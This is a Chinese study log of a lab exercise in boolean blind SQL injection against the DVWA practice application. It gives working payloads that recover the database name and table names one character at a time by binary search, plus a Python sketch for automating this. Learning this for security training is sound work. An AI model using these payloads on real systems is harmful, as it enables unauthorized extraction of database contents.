## 二、实操过程记录

### 阶段 1：理解盲注场景（15 分钟）

布尔盲注和前面 Union 注入最大的区别是：页面不再把数据吐出来，只回答「有」或「没有」。所以第一步不是构造 payload，而是先把这个「有/没有」的差异找准。

```sql
# 正常查询
1
# 真条件
1' and '1'='1
# 假条件
1' and '1'='2
```
输入 1：页面显示 User ID exists in the database.

输入 1' and '1'='1：页面同样显示 User ID exists in the database.

输入 1' and '1'='2：页面显示 User ID is MISSING from the database.

> 结论：两种响应肉眼可分，盲注通道成立。这个「exists / MISSING」就是后面所有判断的唯一信息来源。

### 阶段 2：判断数据库名长度（20 分钟）

先要知道猜多少位。用 length() 逐个试，命中时页面回到 exists。

```sql
1' and length(database())=1 and '1'='1
1' and length(database())=2 and '1'='1
1' and length(database())=3 and '1'='1
1' and length(database())=4 and '1'='1
1' and length(database())=5 and '1'='1
```
=1、=2、=3 返回 MISSING，=4 返回 exists，=5 又是 MISSING。

> 结论：数据库名长度 = 4。

验证 payload：1' and length(database())=4 and '1'='1

![判断数据库名长度](/images/csdn/week06/day-031-3.png)

### 阶段 3：逐字符猜解数据库名（40 分钟）

用 substr() 取第 n 位，用 ascii() 转成数字，再用二分法缩小范围。26 个字母遍历最多 26 次，二分法最多 5 次。

```sql
# 第 1 位：先用二分法定位区间
1' and ascii(substr(database(),1,1))>109 and '1'='1   # 真，说明在 m 之后
1' and ascii(substr(database(),1,1))>115 and '1'='1   # 假，说明 ≤ 115
1' and ascii(substr(database(),1,1))>100 and '1'='1   # 假，说明 ≤ 100
1' and ascii(substr(database(),1,1))=100 and '1'='1   # 真
# 第 2 位
1' and ascii(substr(database(),2,1))=118 and '1'='1  # v
# 第 3 位
1' and ascii(substr(database(),3,1))=119 and '1'='1  # w
# 第 4 位
1' and ascii(substr(database(),4,1))=97 and '1'='1   # a
```
第 1 个字符 ASCII 值：100 → 字符 d

第 2 个字符 ASCII 值：118 → 字符 v

第 3 个字符 ASCII 值：119 → 字符 w

第 4 个字符 ASCII 值：97  → 字符 a

数据库名：dvwa

### 阶段 4：获取表名（30 分钟）

表名没法直接 database()，要用子查询从 information_schema 里取，再用 limit 0,1 一行一行拿。思路和猜库名完全一样，只是把 database() 换成子查询。

```sql
# 先猜第一个表名的长度
1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>5 and '1'='1
# 再逐字符猜
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 and '1'='1
```
第一个表名：guestbook（length 命中 9，首字符 g=103）。

第二个表名把 limit 0,1 改成 limit 1,1，得到 users。

这一步最容易写错的地方是括号数量：substr( (子查询) , 1, 1 )。

### 阶段 5：二分法优化与脚本化（20 分钟）

手工猜一位要 5~7 次请求，猜完一个表名要几十次。真实环境一定写脚本，核心就是把「大于」判断包成函数。

```python
# 二分法骨架（Python 伪代码）
lo, hi = 32, 126
while lo < hi:
mid = (lo + hi) // 2
if q(f"ascii(substr(database(),{i},1))>{mid}"):
lo = mid + 1
else:
hi = mid
ch = chr(lo)
# q() 内部：拼接 payload → 发请求 → 判断页面是否含 exists
```
复杂度对比：遍历法最多 26 次/字符，二分法最多 7 次/字符（32~126 区间）。

今天先手工跑通前 4 个字符，脚本留到 Day 032 时间盲注一起写。

### 阶段 6：避坑记录

| 坑点 | 症状 | 解决办法 |
| --- | --- | --- |
| 页面没差异 | 看不出真假 | 看源码 / 比对响应长度，或直接看关键字 exists |
| 引号数量错 | 报错或无响应 | 先测 1' 能不能闭合，再拼 and |
| 括号不匹配 | 语法错 | substr((子查询),1,1) 双层括号要数清 |
| 猜不到下划线 | 字母数字都不对 | 把 ASCII 范围放宽到 32~126，覆盖 _ 和 - |

Q：为什么叫盲注？A：数据不回显，像闭着眼睛注入，只能靠间接判断。

Q：怎么判断真假？A：页面内容、响应长度、状态码、响应时间，四者取其一。

Q：手工太慢怎么办？A：二分法 + 脚本化 + sqlmap（考核禁用）。

## 三、实践心得

1. 盲注的本质是「把一次查询拆成 N 次是非题」。信息量没变，只是被拆成了一个个比特，所以拼的不是技巧，是耐心和请求次数。

2. 二分法之所以重要，不在于快，而在于它有明确的上界：每个字符固定 7 次以内。这在时间盲注里尤其关键，因为每次请求都要等几秒。

3. 第一阶段的 Union 注入是「一次拿全」，盲注是「一次拿一位」。换个场景，同一套 SQL 知识要重新组织成判断题。

## 四、重点与难点

1. 必须记住的知识点

① 布尔盲注三件套：length() 判长度、substr() 取字符、ascii() 转数字。

② 判据可以是页面文字、响应长度、状态码——找一个稳定可分的就行。

③ 二分法把每字符的尝试次数从 26 压到 7 次以内。

④ 取表名要用子查询 + limit 0,1，一行一行往外取。

2. 踩过的坑

① 一开始把 substr(database(),1,1) 写成 substr(database(),0,1)，MySQL 位置从 1 开始，0 位取不到。

② 子查询外层括号漏写，直接语法错，报错页面看起来和「假」一样，误判了好几次。

③ 猜表名时忘了改 limit 0,1，一直拿到同一个表名，以为脚本坏了。

3. 需要补的课

① 补课：MySQL 的 limit m,n 语义，以及 order by limit 组合取第 N 行。

② 补课：盲注在真实环境里怎么被 WAF 拦（关键词、频率）。

③ 预习：Day 032 时间盲注，同一个二分法，判据换成响应时间。
